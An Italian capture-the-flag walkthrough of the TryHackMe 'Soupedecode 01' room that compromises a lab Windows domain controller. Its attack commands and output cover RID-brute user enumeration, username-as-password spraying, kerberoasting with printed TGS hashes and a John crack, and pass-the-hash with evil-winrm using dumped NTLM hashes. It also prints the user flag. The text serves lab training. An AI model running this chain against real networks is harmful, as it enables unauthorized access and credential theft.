#tryhackme 

https://tryhackme.com/room/soupedecode01

Soupedecode è una sfida intensa e coinvolgente in cui i giocatori devono compromettere un controller di dominio sfruttando l'autenticazione Kerberos, navigando attraverso le condivisioni SMB, eseguendo spraying con password e utilizzando tecniche Pass-the-Hash. Preparati a testare le tue abilità e strategie in questa multiforme avventura di sicurezza informatica.


```
nmap -Pn -v -p- 10.80.150.73
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49676/tcp open  unknown
49714/tcp open  unknown

```
enumeriamo i servizi sulle porte
```
nmap -sVC -v -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49676,49714 10.80.150.73
```
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 17:23:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-22T17:18:05
| Not valid after:  2026-06-23T17:18:05
| MD5:   5548:5176:762d:1ba6:752d:5f94:56ec:7cb5
|_SHA-1: 13af:304c:75cf:2658:3d9a:9949:9bdf:6272:7ba6:bd20
|_ssl-date: 2025-12-23T17:25:23+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-23T17:24:44+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-12-23T17:24:44
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 12:25
Completed NSE at 12:25, 0.00s elapsed
Initiating NSE at 12:25
Completed NSE at 12:25, 0.00s elapsed
Initiating NSE at 12:25
Completed NSE at 12:25, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.86 seconds
           Raw packets sent: 21 (900B) | Rcvd: 18 (776B)

```

Abbiamo ottenuto il nome del dominio Active Directory
**DC01.SOUPEDECODE.LOCAL**

aggiungiamo i domini trovati al file hosts

```
echo 10.80.150.73   DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL >> /etc/hosts
```

ora facciamo un po di enumerazione di samba
```
smbmap -H 10.80.150.73 -u 'anonymous'
```
```
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.80.150.73:445        Name: DC01.SOUPEDECODE.LOCAL    Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections   
```
ci connettiamo al remote IPC
```
smbclient //10.80.150.73/IPC$
```
```
└─# smbclient //10.80.150.73/IPC$     
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 
```

https://medium.com/@AyanPaul007/tryhackme-soupedecode-01-walkthrough-rootrang3r-cb71e559ef77

possiamo provare ad enumerare i nomi utenti
```
nxc smb SOUPEDECODE.LOCAL -u guest -p '' --rid-brute --log LOG
```
```
SMB         10.81.131.139   445    DC01             2150: SOUPEDECODE\PC-78$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2151: SOUPEDECODE\PC-79$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2152: SOUPEDECODE\PC-80$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2153: SOUPEDECODE\PC-81$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2154: SOUPEDECODE\PC-82$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2155: SOUPEDECODE\PC-83$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2156: SOUPEDECODE\PC-84$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2157: SOUPEDECODE\PC-85$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2158: SOUPEDECODE\PC-86$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2159: SOUPEDECODE\PC-87$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2160: SOUPEDECODE\PC-88$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2161: SOUPEDECODE\PC-89$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2162: SOUPEDECODE\PC-90$ (SidTypeUser)
SMB         10.81.131.139   445    DC01             2163: SOUPEDECODE\firewall_svc (SidTypeUser)
SMB         10.81.131.139   445    DC01             2164: SOUPEDECODE\backup_svc (SidTypeUser)
SMB         10.81.131.139   445    DC01             2165: SOUPEDECODE\web_svc (SidTypeUser)
SMB         10.81.131.139   445    DC01             2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
SMB         10.81.131.139   445    DC01             2168: SOUPEDECODE\admin (SidTypeUser)
.....................next
```
ne otteniamo molti, ci sarebbe utile esportarli in una lista

```
awk -F'\\\\' '{gsub(" \\(SidTypeUser\\)", ""); print $2}' LOG > utenti.txt
```
	editare successivamente l'output per migliorare la lista
se vogliamo verificare la validità dei nomi utenti (opzionale)
```
/home/kali/Downloads/kerbrute userenum -d soupedecode.local --dc 10.81.186.76 utenti.txt
```
**Password Spraying**
a volte gli utenti impostano la loro password uguale al loro nome utente
possiamo provare la spruzzatura di password con questi account utente per ottenere le credenziali SMB valide, non lo forzeremo perché a volte gli account potrebbero essere bloccati.

```
netexec smb SOUPEDECODE.LOCAL -u utenti.txt -p utenti.txt --no-bruteforce
```
```
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.81.186.76    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 

```
Opzionale Altro comando per eseguire lo Spray di Password
```
nxc ldap SOUPEDECODE.LOCAL -u utenti.txt -p utenti.txt --no-bruteforce --continue-on-success | grep "[+]"
```

abbiamo trovato una credenziale `ybob317:ybob317.`utilizziamola per l'enumerazione della SMB.
```
nxc smb SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' --shares
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nxc smb SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' --shares
SMB         10.81.186.76    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.81.186.76    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.81.186.76    445    DC01             [*] Enumerated shares
SMB         10.81.186.76    445    DC01             Share           Permissions     Remark
SMB         10.81.186.76    445    DC01             -----           -----------     ------
SMB         10.81.186.76    445    DC01             ADMIN$                          Remote Admin
SMB         10.81.186.76    445    DC01             backup                          
SMB         10.81.186.76    445    DC01             C$                              Default share
SMB         10.81.186.76    445    DC01             IPC$            READ            Remote IPC
SMB         10.81.186.76    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.81.186.76    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.81.186.76    445    DC01             Users           READ    
```

Ora possiamo avere **accesso** in lettura **alla** **condivisione** **degli** **Utenti** nel dominio.

```
smbclient //soupedecode.local/Users -U 'ybob317'%'ybob317'
```
```
└─# smbclient //soupedecode.local/Users -U 'ybob317'%'ybob317'

Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Jul  4 18:48:22 2024
  ..                                DHS        0  Wed Dec 24 01:56:13 2025
  admin                               D        0  Thu Jul  4 18:49:01 2024
  Administrator                       D        0  Wed Dec 24 02:05:50 2025
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  ybob317                             D        0  Mon Jun 17 13:24:32 2024

```
```
smb: \ybob317\> cd Desktop
smb: \ybob317\Desktop\> dir
  .                                  DR        0  Fri Jul 25 13:51:44 2025
  ..                                  D        0  Mon Jun 17 13:24:32 2024
  desktop.ini                       AHS      282  Mon Jun 17 13:24:32 2024
  user.txt                            A       33  Fri Jul 25 13:51:44 2025

                12942591 blocks of size 4096. 10803154 blocks available
smb: \ybob317\Desktop\> get user.txt
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \ybob317\Desktop\> exit

```
trovata la prima flag!
```
└─# cat user.txt  
28189316c25dd3c0ad56d44d000d62a8
```
**volendo si puo ottentere più rapidamente gli utenti Kerberostable con impacket (saltare più avanti)**

**RustHound-CE** è uno strumento di raccolta dati BloodHound multipiattaforma. Genera quindi tutti i file JSON che possono essere analizzati da BloodHound Community Edition.

raccogliamo dei dati con rusthound-ce
```
./rusthound-ce -d SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' -f dc01.soupedecode.local -c All -z
```
```

[2025-12-24T08:14:05Z INFO  rusthound_ce] Verbosity level: Info
[2025-12-24T08:14:05Z INFO  rusthound_ce] Collection method: All
[2025-12-24T08:14:05Z INFO  rusthound_ce::ldap] Connected to SOUPEDECODE.LOCAL Active Directory!
[2025-12-24T08:14:05Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-12-24T08:14:05Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-24T08:14:06Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=SOUPEDECODE,DC=LOCAL
[2025-12-24T08:14:06Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-24T08:14:07Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
[2025-12-24T08:14:07Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-24T08:14:08Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
[2025-12-24T08:14:08Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-24T08:14:08Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
[2025-12-24T08:14:08Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-24T08:14:08Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
[2025-12-24T08:14:08Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2025-12-24T08:14:08Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2025-12-24T08:14:08Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 969 users parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 101 computers parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2025-12-24T08:14:08Z INFO  rusthound_ce::json::maker::common] .//20251224031408_soupedecode-local_rusthound-ce.zip created!

```

avviamo BloodHound e ci trasciniamo il file zip 

ora cerchiamo il dominio interessato 
```
DOMAIN ADMINS@SOUPEDECODE.LOCAL
```
andiamo in CYPHER selezioniamo tra le query salvate **ALL Kerberostable users**

Dopo aver trovato alcuni utenti cheberoastabili nel dominio, faccciamo kerberoast mirato su di loro.
```
nano usernames.txt
```
```
file_svc
firewall_svc
backup_svc
web_svc
monitoring_svc
```

```
python3 /home/kali/Downloads/WinEnum/targetedKerberoast.py -v -d 'SOUPEDECODE.LOCAL' -u 'ybob317' -p 'ybob317' -U usernames.txt
```
```
[+] Printing hash for (web_svc)
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$aa94cd04cb602489b66385eda7ee940c$cd0d4ee8818e4e4410b67df1219c0a20b20c176f92eaa1e60b0f6c6ed704d02bde7dfba86b3179f95b9926b37da98bfb5653a043d3a6c71db737b6808d3cd84c168a3074182ce78b2252ff078c725762d4d92be21dd9dcb3022c3d080a9ef3d5a6d46c47e17d9bf59ed6a9aaa62c36700f6b376abd6257b82e7621ad859429ebb7536dda8a37a9ae2aa7c81e9f7266982be0c55466cc839ec5c78ca8d5f358ef06c6a9f79d13787d9e78cfb2db7a7fea980cfc89dc14f7e8074d2240996cce85d524d436033c3d91230c81bddd4e1ccbecc504ba4ef3e1510bde0bdbcbfee4a580f8fae0d5a3a2314e72aeaa2dffd1242d8b0ca60b73754b6ffbb1c2ed7f553ebd1fe0a2d947eb49c6507c87c893639cf1f9a5cc08e360e4e0079ad9bf7a5c53f20b837c5e3305fbbbb4200e7d8768522a0e3e883813877ac07af27c7a9d29956ec1b16f16d2973f776ac962b026baa4eb23d5c1d1ffe73e19acd964f54a7d4348d23f0b8f808732dfdad562cb2437012b3b659e7ffca913c7c143cbb9a5f5ce8cee54d553c243484a495509a2861a1b5f927f72096bae0962a845164973e1d26f27e53b758e1b95ee10ed200949fa093a0337a43eed196151942237c917270a5ff11fcf101111f2379a40a91b3f9e67ed278cd1c575b64e051aeb28d3c538a86160c734fdbc6fd08a93c3f1216c176ce7b29dfd5008209ddd524d43fa43babd6b602dba82ae4cf5ebe8c6ce0336c98e3c5b6b16c44a3eba74e565865b59f56efb06c12ebe6357286400d618cf91fff88f97a2ce17a56ddfca2f784a03fc2da5d41e68251400b5699bd342f2845ce41a699b3f12e6c2b41f884953b405157c44bf68b7897513440b2ffeb5f77f61eedfda0c59c124d90a389de8385688cab37dc7544da36d7b31ad7be1b3797b2a58738d4664e9b5146861556c3c79610d0821b0f0fd3d288cadb81a93572661f5f8867640d676c8111495601cb64af0faaa2e6b4c179a0e3766f94f8be57421b6e71d1b5a306eb0879b9cd6d9af210ad1b8fde1523cdf6e785e74ffb93eff6c1fb6c6548f8aee788639009e13aca8e65856bf43d618c525a29601f157130a1024621097697bd7173cb7460a12658428064d9d83bca74f6849afa6af2182964680a7edf1845f0d99cdd814a33b254ab949bc9df387c682edf50b6c4bbf9fb6799d3a3182b2b4c3eb48563a18caeb921c186e040c5f9948bd22861899ccd0363c1b040f38638afc043cb7f992c2b209a25d5493d6849f0b22a6ba62304d12c25f1f373487d57411ad5df621ee01f3fa296b80064fab524b843bb3cf12bbe44912ec1fc81a8fc078989274f0e941800d7ae44a88e1bcd8ea937b9cf380b5d408f8a9f092a4be38dba848b30f6dc9cc92894f526835642a095ee801fe9cf745b4088b1e1c6346ef17e7a389a3c5d4bb9ca243b45788fdd0d346d8626b38e9ba5134bf5b0fcbb915cf6bf377d603ef20db70a4117130
[+] Printing hash for (file_svc)
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$d1db75b40c6f8b8bdf4a4d7f550cc36d$8de8d57d6feebbcd4bdb6756c419936d5b1654f9a3da9471b815f396571540a0f43983fdd95cf810e7e3030f88257b2b897eb764c5f500f024415332f256aa34aa10a4e905d7b6a88dc728ec139baaa92bfe5788187860a84a2867cd1a357eb314b05925eca48d701973c484edb4adf0e17f7d7b949df7a973607c0c136dab20b0b76f6a756fa4438851a09de130df0237a550afcb414845480098da5b7d3ceee221a2394ac1012aca01fbffed95e6bda2578ba296e1fff3445c39ba5927ef79baae501678063165923faf25db
```
**Stesso risultato ma più rapido è ottenibile con impacket**
```
impacket-GetUserSPNs -request SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.80.189.151 -output out.txt
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# cat out.txt   
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$a2c2adc81d491739f680b7753a7a4758$6db20ce21c194a8e2e263ef191e645cb124d515e1fa2d20fd10eada6da1486b3c9f1fc7ac8e825d0347b0eafd2fea023ece81c9d755799cc54c21f5cfd9a99f9a6b8674270af6d20219636e7ba080ca6ae9093a9b7bf0f45c1e05c91491ff0133e9938a7b6a3f67a0daae3d76c92137f9a816d2f20d1b0887c357b9ef2b95d86788af85b4b874d4eccf426c8a4b503642b8951901350c3f961a7fbe52776362632d5f0ba08c2.....................
```

Abbiamo recuperato i biglietti del TGS per questi account. Decifichiamo l'hash di file_svc con John the Ripper.
```
john out.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# john out.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:25 DONE (2025-12-24 06:57) 0.03880g/s 556606p/s 2642Kc/s 2642KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Abbiamo ricevuto questa password per l'account **file_svc** sul dominio

```
nxc smb soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
```
```
└─# nxc smb soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
SMB         10.82.165.206   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.82.165.206   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.82.165.206   445    DC01             [*] Enumerated shares
SMB         10.82.165.206   445    DC01             Share           Permissions     Remark
SMB         10.82.165.206   445    DC01             -----           -----------     ------
SMB         10.82.165.206   445    DC01             ADMIN$                          Remote Admin
SMB         10.82.165.206   445    DC01             backup          READ            
SMB         10.82.165.206   445    DC01             C$                              Default share
SMB         10.82.165.206   445    DC01             IPC$            READ            Remote IPC
SMB         10.82.165.206   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.82.165.206   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.82.165.206   445    DC01             Users         
```

ora abbiamo accesso in lettura anche su backup

```
smbclient //soupedecode.local/backup -U file_svc%'Password123!!'
```


```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# smbclient //soupedecode.local/backup -U file_svc
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Fri Jul 25 13:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 10708719 blocks available
smb: \> 
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# smbclient //soupedecode.local/backup -U file_svc%'Password123!!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Fri Jul 25 13:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 10708719 blocks available
smb: \> get backup_extract.txt
getting file \backup_extract.txt of size 892 as backup_extract.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

```
Il file contiene hash di password NTLM per diversi account
dopo aver provato varie autenticazioni troviamo quella giusta

```
evil-winrm -i soupedecode.local -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559
```
esploriamo le cartelle
```
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         6/15/2024  10:54 AM                3D Objects
d-r---         6/15/2024  10:54 AM                Contacts
d-r---         7/25/2025  10:51 AM                Desktop
d-r---         6/18/2025   2:38 PM                Documents
d-r---         6/15/2024  10:54 AM                Downloads
d-r---         6/15/2024  10:54 AM                Favorites
d-r---         6/15/2024  10:54 AM                Links
d-r---         6/15/2024  10:54 AM                Music
d-r---         6/15/2024  10:54 AM                Pictures
d-r---         6/15/2024  10:54 AM                Saved Games
d-r---         6/15/2024  10:54 AM                Searches
d-r---         6/15/2024  10:54 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/17/2024  10:41 AM                backup
-a----         7/25/2025  10:51 AM             33 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
xxxxxxxxxxxxxxxxxxxxx

```
trovata la flag di root!


